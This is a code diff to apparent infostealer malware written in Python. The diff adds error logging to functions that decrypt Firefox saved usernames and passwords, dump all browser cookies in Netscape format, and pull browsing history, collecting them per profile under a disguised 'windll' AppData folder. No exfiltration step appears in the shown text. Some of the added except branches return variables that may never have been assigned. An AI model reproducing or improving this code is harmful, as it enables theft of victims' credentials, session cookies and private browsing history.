@@ -21,7 +21,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 import glob
 from pyasn1.codec.der.decoder import decode as der_decode
-
+from manager.logger import Log
 from Crypto.Cipher import AES, DES3
 
 
@@ -136,27 +136,31 @@ def decodeLoginData(key, data):
 
 
 def exportLogins(key, jsonLogins):
-    if "logins" not in jsonLogins:
-        return []
-    logins = []
-    for row in jsonLogins["logins"]:
-        encUsername = row["encryptedUsername"]
-        encPassword = row["encryptedPassword"]
-        logins.append(
-            (
-                row["hostname"],
-                decodeLoginData(key, encUsername),
-                decodeLoginData(key, encPassword),
+    try:
+        if "logins" not in jsonLogins:
+            return []
+        logins = []
+        for row in jsonLogins["logins"]:
+            encUsername = row["encryptedUsername"]
+            encPassword = row["encryptedPassword"]
+            logins.append(
+                (
+                    row["hostname"],
+                    decodeLoginData(key, encUsername),
+                    decodeLoginData(key, encPassword),
+                )
             )
-        )
-    passwords = ""
-    for login in logins:
-        passwords += f"""
+        passwords = ""
+        for login in logins:
+            passwords += f"""
 URL: {login[0]}
 LOGIN: {login[1]}
 PASSWORD: {login[2]}
 """
-    return passwords
+        return passwords
+    except Exception as e:
+        Log(f"{key},{jsonLogins} logins ---> {e}")
+        return passwords
 
 
 def getJsonLogins(directory):
@@ -175,51 +179,55 @@ def decrypt_value(encrypted_value, key, iv):
 
 # Getting cookie
 def get_firefox_cookies(profile_path):
-    cookies_path = os.path.join(profile_path, 'cookies.sqlite')
-
-    if not os.path.exists(cookies_path):
-        return None
-
-    cookies = ""
-    conn = sqlite3.connect(cookies_path)
-    cursor = conn.cursor()
-    cursor.execute("SELECT host, name, value, path, datetime(expiry/1000000,'unixepoch') as expiry FROM moz_cookies")
-
-    for row in cursor.fetchall():
-        host, name, value, path, expires = row
-        # key = getKey(profile_path+"\\")
-
-        cookies += f"{host}\tTRUE\t{path}\tFALSE\t{expires}\t{name}\t{value}\n"
-
-    conn.close()
-    return cookies
+    try:
+        cookies_path = os.path.join(profile_path, 'cookies.sqlite')
+        if not os.path.exists(cookies_path):
+            return None
+        cookies = ""
+        conn = sqlite3.connect(cookies_path)
+        cursor = conn.cursor()
+        cursor.execute("SELECT host, name, value, path, datetime(expiry/1000000,'unixepoch') as expiry FROM moz_cookies")
+        for row in cursor.fetchall():
+            host, name, value, path, expires = row
+            # key = getKey(profile_path+"\\")
+            cookies += f"{host}\tTRUE\t{path}\tFALSE\t{expires}\t{name}\t{value}\n"
+        conn.close()
+        return cookies
+    except Exception as e:
+        Log(f"{profile_path} cookies ---> {e}")
+        return cookies
 
 # Getting history
 def get_history(directory):
-    history_db_path = directory + "places.sqlite"
-    conn = sqlite3.connect(history_db_path)
-    cursor = conn.cursor()
+    try:
+        history_db_path = directory + "places.sqlite"
+        conn = sqlite3.connect(history_db_path)
+        cursor = conn.cursor()
 
-    # Retrieve the history of visited websites
-    cursor.execute("SELECT url, title, datetime(last_visit_date/1000000,'unixepoch') as last_visit_date FROM moz_places")
-    visited_websites = cursor.fetchall()
-    data = ""
-    for website in visited_websites:
-        url = website[0]
-        title = website[1]
-        last_visit_date = website[2]
-        data += f"""
+        # Retrieve the history of visited websites
+        cursor.execute("SELECT url, title, datetime(last_visit_date/1000000,'unixepoch') as last_visit_date FROM moz_places")
+        visited_websites = cursor.fetchall()
+        data = ""
+        for website in visited_websites:
+            url = website[0]
+            title = website[1]
+            last_visit_date = website[2]
+            data += f"""
 URL: {url}
 Title: {title}
 Last Visit Date: {last_visit_date}
 """
-    return data
+        return data
+    except Exception as e:
+        Log(f"{directory} cookies ---> {e}")
+        return data
 
 
 
 
 
 def GeckoDriver(data):
+    Log("===========GeckoDriver===========")
     appdata = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'
     pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\windll'
 
@@ -244,7 +252,7 @@ def GeckoDriver(data):
                 browsers_data[key+"_"+str(i)]["Browser_Cookies"] = get_firefox_cookies(profile_path)
                 browsers_data[key+"_"+str(i)]["Browser_History"] = get_history(profile_path)
             except Exception as e:
-                pass
+                Log(f"{profile_path} global ---> {e}")
             i += 1
             
     if browsers_data:
